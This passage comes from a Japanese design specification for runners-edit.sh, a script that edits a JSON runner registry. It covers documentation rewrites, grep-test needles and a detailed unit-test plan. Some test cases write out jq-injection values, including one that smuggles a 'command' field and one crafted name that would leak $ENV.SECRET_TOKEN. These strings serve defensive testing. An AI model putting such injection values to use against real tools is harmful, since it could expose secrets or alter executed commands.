  記述があり、SU5 の `shell_ready_ms`（165 行）もここにある。§3.1 が
  「`--reset runners` はどちらのスクリプトも通らない」の論拠に使う節でもある。
  **改題作業で隣接節を巻き込みやすいので、変更不要側にも節として明記する。**
- **`CLAUDE.md:152`（保守項目 10）**。今回触る 6 フィールドの role 単位一致を 4 ファイルで
  検査する項目だが、主語が解決規則なので変更後も真。「この表が SoT」を名乗る以上、
  変更不要側に明記しておく。
- **`SKILL.md:860` / `guide-ja.md:287`**（`--override` の「Model strings are not validated」）。
  主語が `--override` なので変更後も真。
- `runners.json` スキーマ節（`SKILL.md:337-372` / `guide-ja.md:1560-1591` /
  **`README.md:324-350`**。6 フィールドと既定値表が既に完備）

#### 3.1 「All writes go through …」の改題と I/F 段落の追記

**既存本文は残したうえで改題し、1 段落を追記する。** 置換すると SU5 が grep する
**6 個**の needle が全滅する。この節（`setup-mode.md:47-61`）に含まれるのは:

`Never hand-assemble a jq invocation`（49 行）/ `merges instead of replacing`（57）/
`shell_ready_ms`（57）/ `writer-specific`（58）/ `mktemp "$CONFIG.XXXXXX"`（59）/
`only when jq succeeded`（59）

**とりわけ冒頭の `Never hand-assemble a jq invocation for these files`（49 行）が
危ない。** この節は「1 ファイル 1 スクリプト」から「2 ファイル 2 スクリプト」へ主語が
変わるので、まさに書き換えたくなる 1 文である。**逐語で残す。**

見出しを `## All writes go through the edit scripts` にするだけでは**偽になる**。
`setup-mode.md` の Scope 表は `runners.json` を含むので、その見出しは
「`--setup` / `--reset` のすべての書き込みは 2 つの edit スクリプトを通る」と読めるが、

- First-run setup は `runners.json` を**自分で書く**（`SKILL.md:487`。非目標により変更しない）
- `--reset runners` は `rm -f "$RUNNERS_JSON"` + First-run setup で、`runners-edit.sh` を
  一切呼ばない
- `runners-edit.sh` はファイル未存在なら exit 2 で、新規作成しない（§1.5）

真に受けた将来の実装者が First-run setup を `runners-edit.sh` に寄せると、exit 2 で
永久にレジストリを作れないデッドロックになる。**主語を field-level 更新に絞る。**

**改題後の見出しを英日で確定させる**（SU8 は見出し数しか見ないので、別々に改題しても緑）。

| ファイル | 改題後の見出し（逐語） |
|---|---|
| `setup-mode.md` | `## All field-level writes go through the edit scripts` |
| `setup-mode-ja.md` | `## フィールド単位の書き込みは全て edit スクリプトを通す` |

**追記する限定文**（`setup-mode.md`。JA は訳）:

> The two edit scripts own every **field-level** update. Creating `runners.json` from
> scratch and rebuilding it stay with First-run setup (SKILL.md Step 1f), which writes
> the file itself; `runners-edit.sh` only edits an existing registry and
> **exits 2 when the file is absent**.

**追記する I/F 段落**は、既存の `config-edit.sh` の I/F 記述（`--get <key>` and `--show`
read without writing まで）と同じ粒度で `runners-edit.sh` を書く。次を**逐語で**含める。

- **7 つの long flag すべて**: `--runners` / `--name` / `--set` / `--unset` /
  `--get` / `--show` / `--dry-run`。**SU14 はこの 7 個が doc に現れることを検査する**
  ので、1 つでも欠けると必ず落ちる（`--get` は §2 のフローに登場しないため、
  この段落が唯一の置き場所）。
- **`mktemp "$RUNNERS.XXXXXX"`**（逐語）。既存本文の `mktemp "$CONFIG.XXXXXX"` と
  同じ形。**SU11 の needle はこの文字列**にする（`runners.json.XXXXXX` にすると、
  `--runners` が任意パスを取る以上 doc と実装が食い違う）。
- **フラグの列挙は次の 1 文を逐語で置く**（SU11 の needle。7 フラグのうち
  `--set` / `--unset` / `--get` / `--show` は既存の `config-edit.sh` 例文にも現れるため、
  個別 grep では「I/F 段落から落ちたが他所に在る」を検出できない）:
  `runners-edit.sh takes --runners and --name, then one of --set / --unset (optionally with --dry-run), --get, or --show.`
- exit code 0 / 1 / 2 の意味と、置換ではなくマージすること。
- `exits 2 when the file is absent` と `First-run setup`。**SU11 の needle。**
- **§1.4 が「文書化のみ」と決めた 3 つの既存挙動**を次の 1 文で逐語で置く（SU11 の needle。
  文書化が唯一の緩和策なので、書かれなければ緩和策が存在しないのと同じ）:
  `The write is last-write-wins, replaces a symlink with a regular file, and leaves the temp file's mode on the result.`

**追記する段落では、`runners-edit.sh` を含む行に `--config` を書かない。** 2 スクリプトを
対比するなら行を分ける。SU14 の逆方向は code fence 内に限定されているので散文の対比は
安全だが、fence 内で 1 行に混ぜると誤 FAIL する。

`setup-mode-ja.md` にも同じ段落を訳して置く。**JA 側も改題する**
（`## 書き込みは全て \`config-edit.sh\` を通す` → `## フィールド単位の書き込みは全て
edit スクリプトを通す`）。**既存本文（`setup-mode-ja.md:41-48`）は 1 文字も消さない。**
SU8 は見出し数しか見ないので片方だけ改題しても緑になる — **これを守るのは §4.2 の
SU11 / SU15 に置いた「新見出しが存在し旧見出しが存在しない」アサーション**である。
`runners-edit.sh` / `mktemp "$RUNNERS.XXXXXX"` の needle は I/F 段落が満たすので、
改題の有無とは独立している（旧見出しを残したまま I/F 段落だけ足した doc でも緑になる）。SKILL.md の
`Both modes write exclusively through scripts/config-edit.sh` も同じ限定を付ける
（`--reset runners` は 2 スクリプトのどちらも通らないため、無条件の「2 スクリプトを
通る」は `--reset` について偽になる）。

#### 3.2 言語規則と既存テストの保護

**言語**: `SKILL.md` と `references/` 配下の `*-ja.md` でないファイルには日本語を
1 文字も書かない。`README.md` / `CLAUDE.md` / `*-ja.md` は日本語。
`node scripts/check-doc-lang.mjs` が硬いゲートとして効く。
**`runners-edit.sh` のコメントは日本語**（ルート / プラグイン CLAUDE.md の規約、
`config-edit.sh` の全コメントと同じ。`check-doc-lang.mjs` は `.sh` を見ないので
機械的には落ちない分、明記しておく）。

**ユーザー可視文字列は §2 の英日対応表に従う。** 英語 doc の表記をそのまま
ユーザーへ出してはならない。`check-doc-lang.mjs` は `*-ja.md` について
`empty-translation` しか見ないので、英語ラベルの素通りは機械的に検出できない。

**既存テストが grep する文字列を壊さない**:

- `test-setup-skill.sh` の SU5 は **2 ブロック・計 10 個**の文字列を `setup-mode.md` の
  平坦化テキストから探す。すべて温存する。
  - 書き込み契約 7 個: `merges instead of replacing` / `shell_ready_ms` /
    `writer-specific` / `mktemp "$CONFIG.XXXXXX"` / `only when jq succeeded` /
    `single atomic move` / `Never hand-assemble a jq invocation`
  - 三値セマンティクス 3 個: `a fixed value` / `the key absent` /
    `persistence options stay hidden`（三値セマンティクス節は今回**触らない**。
    所在は 40-42 行で改訂対象外）
  - **10 個のうち 7 個が今回の改訂対象セクション内にある**: S7（140 行）の
    `single atomic move` が 1 個、`## All writes go through …` 節（47-61 行）の
    6 個（§3.1 の列挙）。**どちらの節も本文は逐語で残す。**
    `shell_ready_ms` は 57 行と 165 行の 2 箇所にあるが、**57 行は改訂対象内**なので
    165 行を安全弁にしない。
- SU1 は `SKILL.md` に `scripts/config-edit.sh` があることを求める。**温存する。**
- SU8 は `setup-mode.md` と `setup-mode-ja.md` の H1-H3 見出し数の一致を求める
  （現在**英日とも 18 個**）。`### S3-M` を両方へ足して 19 個ずつにする。下位見出しを
  `####` にするのはこのため。

---

### 4. テスト

#### 4.1 新規 `test/test-runners-edit.sh`（動的ユニットテスト）

`test-config-edit.sh` と同型。実際に一時ディレクトリへ `runners.json` を作り、
スクリプトを実行して結果を検証する。

| id | 不変条件 |
|---|---|
| RE1 | `--set` が指定 runner のフィールドだけを更新し、他 runner と `default` の**値**を変えない（jq は再整形するのでバイト比較は使わない） |
| RE2 | allowlist 外のフィールド名は exit 2。**`--set engine=codex` / `--unset engine` / `--get engine` の 3 モードすべて**に加え、**`--set command=x` / `--unset command` / `--unset name` / `--unset default`**（runner の同一性に触らないことの唯一の機械的担保。`command` は実際に実行される文字列）と綴り違い |
| RE3 | engine 別 effort allowlist。**負**: claude runner に `minimal`、codex runner に `max` はどちらも exit 2。**正のコントロール**: claude×`max` / claude×`low` / codex×`minimal` / codex×`xhigh` は exit 0 で実際に書き込まれる（CE6 が正負の両半分を持つのに倣う） |
| RE4 | model はモデル名を allowlist しない: `[A-Za-z0-9._\[\]/-]` からなる任意の未知文字列が通る。**exit 2 になるもの**: 空文字 / 空白のみ / **前後に空白を持つ値**（`  fable` / `fable  `）/ `'` / `"` / `` ` `` / `$` / `\` を含む値 / ESC（`\033`）を含む値 |
| RE5 | `--unset` が該当フィールドだけを削除し、同レコードの他フィールドを残す。**不在フィールドへの `--unset` は exit 0（冪等）** |
| RE6 | 未知の `--name` は exit 2 かつファイルが `cmp` でバイト同一 |
| RE7 | 複数の `--set` / `--unset` が 1 回の呼び出しでまとめて反映される |
| RE8 | 壊れた JSON では exit 1 かつ元ファイルを破壊しない。**読み取り権限の無い既存ファイルも exit 1**（`[[ $EUID -ne 0 ]]` ガード付き、`chmod` を戻してから assert）。**0 バイトの既存ファイルも全モード exit 1**（jq は空入力に rc=0 を返すので、明示チェックが無いと素通りする）。いずれも jq 由来の rc=5 / rc=2 が漏れていないこと |
| RE9 | temp の残骸がゼロ。経路は 7 つ: 成功 / `*_model` 検証エラー exit 2 / effort 検証エラー exit 2 / 未知 `--name` exit 2 / **壊れた JSON exit 1**（旧 RE19。手順 2 で落ちる経路の残骸検査）/ `--dry-run` / `mv` 失敗。**ただし残骸ゼロを保証するのは trap であって順序ではない**（順序は RE9d が見る） |
| RE9b | **`mv` 失敗**は `chflags uchg`（対象ファイルを immutable 化）で作る。`mktemp` は親ディレクトリに作られるので**親を read-only にすると mktemp 段で落ち、`mv` 失敗ハンドラに到達しない**。exit 1 / 固有メッセージ / 残骸ゼロ / 原ファイル無傷を assert する。`chflags nouchg` を**アサーション前**に必ず実行する（`trap 'rm -rf "$TMP"' EXIT` が uchg ファイルを消せずテスト自身が残骸を残すため）。`chflags` 不可なら skip |
| RE9c | **`mktemp` 失敗**（`chmod 555` の親ディレクトリ）は exit 1・固有メッセージ・残骸ゼロ・ファイル無変更。**`chmod 755` をアサーション前に必ず戻す**（555 のディレクトリは `rm -rf` で消せず `$TMP` が丸ごと残る）。**`[[ $EUID -ne 0 ]]` で skip**（root では 555 が書き込みを止めないので mktemp が成功して逆向きに壊れる） |
| RE9d | **順序の直接検証。** `chmod 555` の親に置いた既存 `runners.json` に対し **effort 検証エラー**と**未知 `--name`** を実行し、**exit 2** を assert する。誤った順序（mktemp が検証より前）の実装は mktemp が Permission denied で落ちて rc=1 になる。**残骸ゼロではなく exit code が順序の観測窓である。** `*_model` 検証エラーは**正のコントロールとして**同時に流すが、この検証は手順 0（引数パース）にあるため mktemp を手順 0 直後に置いた誤実装でも rc=2 になる — **順序の観測窓ではない**。RE9c と同じ root ガードと `chmod` 復元を行う |
| RE9e | **`--dry-run` の no-mktemp 規則と、読み取りモードの no-mktemp。** `chmod 555` の親で `--dry-run` を実行し、**exit 0 かつ正しいレコードを stdout へ出す**ことを assert する。mktemp する実装はここで落ちる。**同じフィクスチャで `--show --name` と `--get` も exit 0 で正しい出力**を assert する（mktemp を読み取りモード dispatch より前に置いた実装は RE9d も dry-run も通過するが、S1 の `--show` が rc=1 になる。§1.5 は S1 の読み取りを load-bearing にしている）。RE9c と同じ root ガードと `chmod` 復元を行う |
| RE10 | `--get` / `--show` は非破壊。フィールド未設定は空文字で exit 0。**ファイル不在時も `--get` は空 + exit 0、`--show` は `{}` + exit 0**。**`--show --name <未登録名>` と `--get --name <未登録名>` はどちらも exit 2**（フィールド未設定の exit 0 と区別する）。**破損 JSON に対する `--get` / `--show` はどちらも exit 1**（`{}` + exit 0 に倒れると §2.3 の破損ガードが発火しなくなる） |
| RE11 | 引数エラーはすべて exit 2: モードの同時指定 / モード未指定 / `--runners` 未指定 / `--set` を `--name` 無し / `--get` を `--name` 無し / `--set` が `<field>=<value>` 形式でない / 同一フィールドへの `--set` と `--unset` の同時指定（**順序を問わない。両方向を検査する**）/ **同一フィールドへの `--set` の重複** / **同一フィールドへの `--unset` の重複** / **`--runners` の重複** / **`--name` の重複** / **`--get` の重複** |
| RE12 | 編集対象レコード内の allowlist 外フィールドが生存する（置換ではなくマージ） |
| RE13 | **書き込みモードで** `--runners` が存在しないファイルを指すと exit 2。**かつ親ディレクトリを作らない**（`--runners "$TMP/nodir/runners.json"` に対し `[[ ! -d "$TMP/nodir" ]]`。`config-edit.sh:154` からの `mkdir -p` 写経を検出する）。**ディレクトリを渡した場合も `--set` は exit 2、`--show` は `{}` + exit 0**（`-f` を `-e` に緩めた変異を kill する）。読み取りモードの不在は RE10 |
| RE14a | **注入・拒否側**: `--set 'plan_model=a", "command": "pwned'` → exit 2 **かつ** `cmp` でファイルがバイト同一。**このケースは逸脱分岐に依存する**（撤回すると期待値が変わる。撤回表を参照） |
| RE14b | **注入・往復側**: シェルメタ文字を含まないが **jq 構文として意味を持つ**値を実際に書き込む。`--set 'plan_model=fable[1m]'`（`[` `]` は jq の添字構文。**フィクスチャの現在値
`opus[1m]` とは必ず違える** — 同値だと `--set` を no-op にする変異体でも PASS してしまい
「完全一致往復」が証明できない）で exit 0 + 完全一致往復 + `.command` / `.engine` / `.name` 不変 + 他 runner と `default` 不変。素朴な無引用補間 `.plan_model = $VALUE` は jq 構文エラーで落ちるので確実に検出できる。**逸脱分岐を採っても採らなくても弁別力が残る唯一のケース** |
| RE15 | **書き込みモード、または `--name` 付き読み取りで** `.runners` 欠落 / `null` / 非配列（オブジェクト）に対して **exit 2**（exit 1 では不可）かつファイル無変更。特にオブジェクトが配列へ化けないこと。**`{"runners":[1,2]}`（配列だが要素が非オブジェクト）も exit 2**（型安全 select が無いと手順 4 の jq が `Cannot index number with string` で **rc=5** を返す）。**一方 `{"runners":[{obj},true]}` は手順 3/4/5 をすべて通過し、`--set` / `--dry-run` / `--get` / `--show` がすべて exit 0 で成功し、非オブジェクト要素が生存すること。`{"runners":[true,{obj}]}` の逆順でも同じ**（`first(...)` の短絡で object-first では露見しない `ENGINE` / `--get` / `--show` の型安全ガードを kill する）。`--name` 無しの `--show` は素通しで exit 0 |
| RE16 | `--name` が 2 件一致する（重複 name）レジストリでは exit 2 かつファイル無変更。**隣接ケース（3 モード分）**: `a"b$c` のような `"` / `$` を含む runner 名で、(1) `--set` が成功し当該レコードだけが更新される、(2) **`--get` が正しい値を返す**、(3) **`--show --name` が正しいレコードを返す**。`--name` を jq 式へ補間する実装は、`x") , {leak: $ENV.SECRET_TOKEN} , ("` 相当の名前で環境変数を rc=0 のまま吐く（手順 4 / 6 が補間で書かれても RE1-RE20 の他は全部緑になる） |
| RE17 | `engine` 欠落レコード / `engine: gemini` に `--set plan_effort=high` → exit 2 かつファイル無変更。**一方 `--unset plan_effort` は同じレコードでも exit 0**（engine 検証は `--set <*_effort>` 専用）。**`--dry-run` 版も exit 2**（手順 5 は手順 7a より前） |
| RE18 | `--dry-run` は当該レコードだけを stdout へ出し、**ファイルを変更しない**。`--get` / `--show` との併用は exit 2。**ファイル不在での `--dry-run` は exit 2**。（手順 7a の jq 失敗は §1.4 のとおり witness を構築できないので検査しない） |
| RE18b | **`--dry-run` の出力内容**: 同一引数で `--dry-run` した出力と、実書き込み後に `--show --name` で得たレコードが `jq -S` 正規化のうえ一致する。**(a) fixture の現在値と `--set` の値は必ず異なるものにする**（同値だと「編集前をそのまま出す」実装でも恒真になり、S6 の事故がそのまま通る）。**(b) 同一呼び出しに `--set` と `--unset` を両方載せる**（例 `--set plan_effort=max --unset exec_model`。**フィクスチャは `engine: claude` の runner にする** — codex には `max` が無いので effort allowlist で exit 2 になり (a)(b)(c) の assert 以前に落ちる。S6 は S7 と完全に同じ引数群を使う規定であり、`--unset` を無視する実装は codex `review_model` の unset プレビューを嘘にする）。**(c) 比較後に `.plan_effort == "max"` と `has("exec_model") == false` を追加で assert する**（等価性が恒真になるのを防ぐ正のコントロール） |
| RE19 | **欠番。** 旧 RE19「手順 2 の parse 失敗で temp が 1 件も作られていない」は、**trap があるため correct と誤実装が完全に同一の結果（rc=1 / 残骸 0 / 原ファイル保持）になり弁別力がゼロ**だった。残骸検査としての価値だけを RE9 の 7 経路目へ移し、順序検証は RE9d が担う。id を詰めると CLAUDE.md の `RE1-RE20` 表記とずれるので欠番として残す |
| RE20 | `runners[]` が空配列のレジストリに対する `--set` は exit 2（`--name` が 0 件一致）。**`--name` 無しの `--show`** は素通しで exit 0 |

#### 4.2 `test/test-setup-skill.sh` の拡張（SU10〜SU16）

既存の SU1〜SU9 は変更しない。冒頭の必須ファイルリスト（現在 5 ファイル）に
`runners-edit.sh` を足し、SU12 / SU13 のアサーションを同じ担保の内側に置く。
**必須ファイルチェックは `-f` だけなので、SU14 が `-x` を明示的に確認する。**

**needle は SU5 と同じ形式で逐語列挙する**（概念だけ書くと実装者が grep 文字列を発明する）。
既存の `need()` ヘルパー（`test-setup-skill.sh:37`）は `grep -Fq --` なので
`[[:cntrl:]]` のようなブラケット式もそのまま安全に扱える。**独自 grep を書く場合は
`-F` を落とさないこと。ただし `need()` は「ファイル」を見るので、平坦化が要る
SU10 / SU15 では使えない** — この 2 つは `en_flat` / `ja_flat` に対する独自ループにする
（`grep -Fq --` は維持する）。

**SU10〜SU16 は SU5 と同じ平坦化テキストに対して `grep -F` する。** SU5 だけが
`en_flat=$(tr '\n' ' ' < "$SETUP_EN" | tr -s ' ')`（`test-setup-skill.sh:71-72`。
コメントも「改行に強い平坦化」）を使っており、新規 SU がこれを継承しないと
**doc の折り返しで長い needle が一致しない**。現物の `setup-mode.md:139-140` は
`so the whole result lands in` / `a single atomic move.` で折り返しており、
SU16 の needle はそのままでは生ファイル grep に一致しない。同じ危険がある needle は
`exits 2 when the file is absent` / `no longer be chosen as the reviewer` /
`edit an existing runner's models and efforts` / 3 段防御 (c) の警告 1 文 /
§3.0.1 の限定句 2 文など多数ある。`ja_flat` も同様に用意する。
**例外は「行」「行番号」を要するアサーション** — SU12 の 4 部 / SU14 の逆方向抽出 /
SU15 の `####` 個数・下限・順序 / SU16 の行順の 4 つは、**生ファイル**に対して実行する。
平坦化テキスト（全文が 1 行）では「ちょうど 1 行」も「含む行だけ」も
`grep -c '^#### '` も成立せず、SU12 は claude 行の `max` を拾い、SU14 は `--config` を
拾って**誤 FAIL する**。平坦化テキストを使うのは**長文 needle の `grep -F` だけ**。

| id | 対象 | needle（逐語） |
|---|---|---|
| SU10 | `setup-mode.md` | `S3-M` / 6 フィールド名 / `edit an existing runner's models and efforts`（S3 選択肢 2）/ `keep (` / `back to the default (` / `unset it (not review-capable)` / `unset (not review-capable)` / `no longer be chosen as the reviewer` / **`it is the current review_runner`**（3 段防御 (c) の S6 警告）/ **`contains a single quote`**（M1 の `'` 除外警告）/ `gpt-5.6-sol` / `the role keys only` / **`pick option 2 or 3 to reach them`**（S2 選択肢 1 の description。`the role keys only` は改訂前の現物に既にあるので、これが無いと §2.2 の変更が 1 文字も入らなくても緑になる）/ `mkdir -p .dispatch` / `shadows the global layer` / `[[:cntrl:]]` / **`padded with whitespace`**（警告文言に含まれる。`leading/trailing whitespace` は `.sh` 側の die_usage 文言なので doc には届かない）/ `only through option 2`（§3.0.1 の限定句） |
| SU11 | `setup-mode.md` | `runners-edit.sh` / `mktemp "$RUNNERS.XXXXXX"` / `exits 2 when the file is absent` / `First-run setup` / `runners-edit.sh takes --runners and --name, then one of --set / --unset (optionally with --dry-run), --get, or --show.`（**末尾のピリオドまで全文**。前半だけを needle にすると文を切り詰めても緑になる）/ `last-write-wins` / `replaces a symlink with a regular file`（句だけだと symlink と mode の 2 挙動が無言で落ちる）。**加えて改題そのもの**: `## All field-level writes go through the edit scripts` が**存在し**、旧見出し ``## All writes go through `config-edit.sh`​`` が**存在しない**こと（needle は I/F 段落が持つので改題の有無と独立してしまう。改題を落としても全ゲートが緑になる穴を塞ぐ） |
| SU12 | `setup-mode.md` **と** `setup-mode-ja.md` の**両方** | 候補プール 2 行のアンカー（下記レシピ） |
| SU13 | `SKILL.md` / `guide-ja.md` / `README.md` | 両方が `runners-edit.sh` を**名指し**していること。**加えて `--override` が両スクリプトを呼ばない旨の逐語 3 本**: `SKILL.md` に ``Never call `config-edit.sh` or `runners-edit.sh` here.``、`guide-ja.md` に `` `config-edit.sh` と `runners-edit.sh` はここでは絶対に呼ばない。``、`README.md` に `runners.json` へも書き戻さない旨。CLAUDE.md 保守手順 44 は人手チェックリストなので、ここが唯一の機械的担保になる |
| SU14 | `runners-edit.sh` と `setup-mode.md` | 存在・`-x`・引数なしで usage + exit 2。**双方向の I/F 整合**（下記） |
| SU15 | `setup-mode-ja.md`（(1) の個数比較のみ `setup-mode.md` も読む） | 6 フィールド名 / `S3-M` / `登録済み runner の model / effort を編集` / `変更なし（現在:` / `既定に戻す（` / `未設定（レビュアーに選べません）` / `未設定に戻す（レビュアーに選べません）` / `レビュアーに選べなくなります` / **`現在の review_runner なので`** / **`名前に ' を含むため`** / `gpt-5.6-sol` / `役割キーのみ` / **`2 か 3 を選ぶと到達できます`**（同上）/ `mkdir -p .dispatch` / `グローバルより優先されることをユーザーに伝える` / `選択肢 2 経由のみ` / **`選択肢 1 / 3 の First-run setup は値を検証しない`** / **`前後に空白`** / **`symlink は通常ファイルに置き換わり`** / **`runners-edit.sh`** / **`mktemp "$RUNNERS.XXXXXX"`**（識別子なので JA 側も同一文字列。§3.1 の改題・限定文・I/F 段落が JA 側に入ったことをこの 2 つで担保する — SU8 は見出し数しか見ないので片方だけ改題しても緑になる）。**加えて改題そのもの**: `## フィールド単位の書き込みは全て edit スクリプトを通す` が**存在し**、旧見出し ``## 書き込みは全て `config-edit.sh` を通す`` が**存在しない**こと。**さらに `####` について 3 点**: (1) 個数が `setup-mode.md` と一致、(2) 両方とも 6 個以上（パリティだけだと両方 0 個で緑になり、S3-M の小節構造が丸ごと欠けても検出できない）、(3) **§3.0.1 の 8 見出しが英日それぞれ「その順序で」出現する**（`grep -n` で行番号を取り、昇順であることを assert する） |
| SU16 | `setup-mode.md` / `setup-mode-ja.md` | §2.6 温存表の逐語 3 文（英日それぞれ。平坦化テキストに対して `grep -F`）。**加えて S7 節内の呼び出し順**（下記） |

**SU12 のレシピ**（重要）: 両ファイルには **claude 行に正当な `max` が現れる**ので、
素の `grep -q max` では必ず FAIL する。一方、行スコープの否定 grep はアンカー行が
消えた瞬間に 0 ヒットで黙って通る。そこで §2.4 の候補プール表の**データ 2 行だけ**を
アンカーにする（ヘッダ行や `codex *_model` 行はアンカーにしない）。

```
| claude `*_effort` | `max` / `xhigh` / `high` / `medium` / `low` |
| codex `*_effort` | `xhigh` / `high` / `medium` / `low` / `minimal` |
```

**この 2 行は §2.4 の候補プール表と 1 バイト単位で同一でなければならない**
（桁揃えの余分な空白も入れない）。§2.4 と SU12 は必ず同時に編集する。

SU12 は 4 部構成にする。

1. 各ファイルで **codex `*_effort` の行がちょうど 1 行**存在する（正のアンカー）。
2. **その行に `max` が無い**（負のアサーション）。
3. **正のコントロール**: claude `*_effort` の行が存在し、**`max` を含む**
   （両方から `max` を消す改訂で緑になる穴を塞ぐ。RE3 が正負両半分を持つのと同型）。
4. 対象ファイルが読めない場合と grep が status ≥ 2 を返す場合は **FAIL**
   （fail-open を禁じる。先例は `test-send-prompt-callsites.sh` の CS1 で、
   ルート `CLAUDE.md` 保守手順 9 に規約として明文化されている）。

**SU14 の双方向 I/F 整合**:

- **順方向**: 引数なし usage に現れる long flag 7 個がすべて `setup-mode.md` に現れる。
  doc の書き漏らしを検出する。
- **逆方向**: `setup-mode.md` の code block のうち、**`runners-edit.sh` を含む行と、
  そこから行末 `\` で継続する行だけ**を対象に `--[a-z][a-z-]*` を抽出し、
  そのすべてが usage に存在する。doc が `--runner` / `--record` のような**実在しない
  フラグを書いている**ケースを検出する。S3-M / S7 をコピーする LLM が踏むのは
  こちらの向きである。
  - 正規表現を `--[a-z-]\+` ではなく `--[a-z][a-z-]*` にするのは、markdown の
    表区切り行・水平線の `---` を拾わないため（2 文字目が `[a-z]` でない）。
    7 フラグはすべて 2 文字目が英小文字なので取りこぼさない。
  - **順方向・逆方向とも照合は語境界付き（`(^|[^a-z-])<flag>([^a-z-]|$)`）にする。**
    素の `grep -F` だと `--set` が `--setup` に、`--runner` が `--runners` に食われ、
    このレシピが名指しした「実在しないフラグの検出」が達成できない
    （`setup-mode.md` には `--setup` が既に 7 箇所ある）。
  - **range を「code block 全体」にしてはならない。** §2.6 は S7 に
    「1. runners-edit.sh → 2. `mkdir -p .dispatch` → 3. config-edit.sh」の 5 手順を
    書けと要求しており、**これを 1 つの ```` ```bash ```` ブロックにまとめるのは
    ごく自然な書き方**である。その瞬間 `--config` が抽出され、`runners-edit.sh` の
    usage に無いので**正しく書かれた doc が誤 FAIL する**。行単位に絞れば、
    2 スクリプトを同一ブロックに書いても安全になる。
  - **range を「ファイル全体」にしてもならない。** §3.1 は `runners-edit.sh` の I/F 段落を
    `config-edit.sh` の既存本文の後ろへ追記させるので、
    `` `runners-edit.sh` takes `--runners <path>` where `config-edit.sh` takes `--config <path>`. ``
    のような**散文の対比行**が書かれやすい。code fence の内側に限定していないと
    この 1 行から `--config` が抽出され、やはり誤 FAIL する。
    実装は code fence（```` ``` ````）のトグルで state を持つこと。
  - **抽出結果が空なら FAIL にする。** `runners-edit.sh` を含む行が code block 内に
    1 行も無いとき、ループが 0 回まわるだけで逆方向の検査が無言で消える。
    ルート `CLAUDE.md` 保守手順 9 と SU12 (4) と同じ fail-open 禁止。

**SU16 の行順アサーション**: 測るのは **S7 節内の呼び出し順**であって、ファイル全体の
初出ではない。§3.1 は `runners-edit.sh` の I/F 段落を
`## All writes go through …` 節（47-61 行）へ追記させるので、**ファイル全体の初出比較は
構造上つねに「config-edit が先」= FAIL** になり、しかも測っているものが S7 ではない。
スコープを `### S7.` 見出しから次の `## ` 見出し直前までに絞る。

```bash
s7=$(awk '/^### S7\./{f=1} f && /^## /{exit} f' "$SETUP_EN")
r=$(grep -n 'runners-edit\.sh' <<<"$s7" | head -1 | cut -d: -f1)
c=$(grep -n 'config-edit\.sh'  <<<"$s7" | head -1 | cut -d: -f1)
[[ -n "$r" && -n "$c" && "$r" -lt "$c" ]]
```

英日とも同じスコープで実行する（JA は `### S7. 書き込み`）。
`awk` は `### S7.` から次の `## ` までを取るので、将来 S7 の後ろに別の `###` 節が
挟まると巻き込む。現物は直後が `## R: --reset` / `## R: --reset` の訳なので問題ない。

#### 4.3 テストに関する注意と、自動テストの限界

- 追加する 2 つのテストは **`prewarm-panes.sh` を一切呼ばない**。したがって
  「`prewarm-panes.sh` を呼ぶテストは先に worktree ディレクトリを `mkdir -p` する」
  という**直近の設計書で確立された実践**（`docs/superpowers/specs/2026-08-18-…` /
  `2026-08-19-…` と本タスクのプロンプトにある。CLAUDE.md には未明文化）に抵触する
  箇所は生じない。実装時にうっかり `prewarm-panes.sh` を呼ぶテストを足さないこと。
- シェルスクリプトは **bash 3.2 互換**（macOS 既定）。`set -u` 下で空になりうる配列を
  展開するときは `${arr[@]+"${arr[@]}"}` を使う。`config-edit.sh` の `JQ_ARGS` が
  まさにこの形。連想配列（bash 4+）は使わない。here-string（`<<<`）は bash 3.2 で使える。
- **自動テストの対象外を明示する。** M1 / M2 / M3 の質問構成、規則 1〜4 による
  候補生成、codex 候補が空のときのフォールバック、"Other" の再質問、S6 への警告
  持ち越し、S7 の非トランザクション性 — これらはすべて md を読む LLM の**実行時挙動**で、
  SU10-16 の grep では担保されない（**規則が doc に書かれたかどうか**は SU10 / SU15 が
  needle で見る）。`runners-edit.sh` の `trap` も回帰テストを持たない。
  リポジトリの先例（`test-loop-skill.sh` / `test-setup-skill.sh` / CS3）も grep 止まり
  なので方針としては整合するが、**限界を認めたうえで** CLAUDE.md「テスト方法」
  E2E 項目 43 に S3-M のケースを追記し、人手で確認する（§3 の同期表に含めてある）。

---

## 検証ゲート

worktree ルートから次をすべて実行する。**`gate exit: 0` 以外は不合格。**
（`test/*.sh` の件数は本タスク完了後に 1 増えるので、件数は書かない。）

```bash
cd "$(git rev-parse --show-toplevel)/apps/cmux-team-dispatch-task" || exit 1
fail=0
for t in test/*.sh; do
  printf '%-46s ' "$t"
  if bash "$t" >/dev/null 2>&1; then echo OK; else echo FAILED; fail=1; fi
done
cd "$(git rev-parse --show-toplevel)" || exit 1
pnpm check || fail=1
echo "gate exit: $fail"
```

FAILED が出たら、当該スイートを**リダイレクト無しで再実行**して原因を読む
（上のループは理由を捨てている）。

`check-doc-lang` が OK を出すこと。`@tanaka-yui/token-meter` の
`noNonNullAssertion` 警告 4 件は既知のノイズで失敗ではない（`biome check` は
warning では exit 0 のまま）。

> `git rev-parse --show-toplevel` は worktree ルートを返す。タスクプロンプトの
> ゲートはメインリポジトリの絶対パスを指しているが、**検証すべきは worktree の
> 変更なのでこれは意図的な訂正**である。

テスト実行後、残骸が無いことを確認する。`git worktree list` は HEAD sha を、
`git branch --list` は `*` / `+` マーカーを含み、**並列ディスパッチ運用では他 worktree の
コミットだけで差分が出る**ので、正規化してから比較する。

```bash
SNAPDIR=$(mktemp -d)
snap() {
  git worktree list --porcelain | awk '/^worktree /{print substr($0,10)}' | sort > "$1"
  git branch --list --format='%(refname:short)' | sort > "$2"
}
snap "$SNAPDIR/wt.before" "$SNAPDIR/br.before"
# ここに上のテストループを差し込む（同じスイートを 2 回走らせないこと）
snap "$SNAPDIR/wt.after" "$SNAPDIR/br.after"
residue=0
diff "$SNAPDIR/wt.before" "$SNAPDIR/wt.after" || residue=1   # && ではなく必ず両方走らせる
diff "$SNAPDIR/br.before" "$SNAPDIR/br.after" || residue=1
echo "residue: $residue"
```

`substr($0,10)` を使うのはパスに空白があると `$2` が壊れるため。**`residue: 0` 以外も不合格。**

## タスク指示からの意図的な逸脱

タスク指示は「**Model strings are NOT validated.** Offer the common claude aliases
… but let any string through.」と述べている。本設計はこの意図（**モデル名の
allowlist を作らない** = 新しいモデル名がそのまま通る）を守るが、
**空 / 空白のみ / 前後に空白を持つ値 / 5 つのシェルメタ文字 / 制御文字だけは拒否する**
